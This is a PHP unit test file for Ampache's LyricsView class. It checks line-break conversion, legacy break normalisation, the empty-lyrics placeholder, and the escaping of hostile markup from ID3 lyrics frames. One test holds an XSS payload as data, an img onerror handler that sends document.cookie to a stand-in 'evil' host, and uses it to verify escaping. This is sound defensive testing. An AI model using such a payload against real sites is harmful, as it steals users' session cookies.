<?php

declare(strict_types=1);

/**
 * vim:set softtabstop=4 shiftwidth=4 expandtab:
 *
 * LICENSE: GNU Affero General Public License, version 3 (AGPL-3.0-or-later)
 * Copyright Ampache.org, 2001-2026
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU Affero General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU Affero General Public License for more details.
 *
 * You should have received a copy of the GNU Affero General Public License
 * along with this program.  If not, see <https://www.gnu.org/licenses/>.
 *
 */

namespace Ampache\Gui\Song;

use Ampache\MockeryTestCase;
use Ampache\Repository\Model\Song;

class LyricsViewTest extends MockeryTestCase
{
    public function testGetLyricsConvertsNewlinesToBreaks(): void
    {
        $subject = new LyricsView(
            'https://music.example',
            $this->mock(Song::class),
            ['text' => "Line one\nLine two"]
        );

        $this->assertSame("Line one<br />\nLine two", $subject->getLyrics());
    }

    /**
     * A hostile ID3 USLT/LYRICS frame (GHSA-jp97-cx77-834v) must never reach the page unescaped.
     */
    public function testGetLyricsEscapesHostileMarkup(): void
    {
        $payload = '<img src=x onerror=fetch("//evil/"+document.cookie)>';

        $subject = new LyricsView(
            'https://music.example',
            $this->mock(Song::class),
            ['text' => $payload]
        );

        $result = $subject->getLyrics();

        $this->assertStringNotContainsString('<img', $result);
        $this->assertStringContainsString('&lt;img', $result);
    }

    /**
     * Lyrics fetched by a provider before this fix were pre-formatted with a real <br>; it must still line-break
     * rather than being shown as literal, escaped tag text now that escaping applies to the whole value.
     */
    public function testGetLyricsNormalizesLegacyStoredBreaks(): void
    {
        $subject = new LyricsView(
            'https://music.example',
            $this->mock(Song::class),
            ['text' => 'Line one<br />Line two']
        );

        $this->assertSame("Line one<br />\nLine two", $subject->getLyrics());
    }

    public function testGetLyricsReturnsPlaceholderWhenEmpty(): void
    {
        $subject = new LyricsView(
            'https://music.example',
            $this->mock(Song::class),
            []
        );

        $this->assertSame('No lyrics found.', $subject->getLyrics());
    }
}
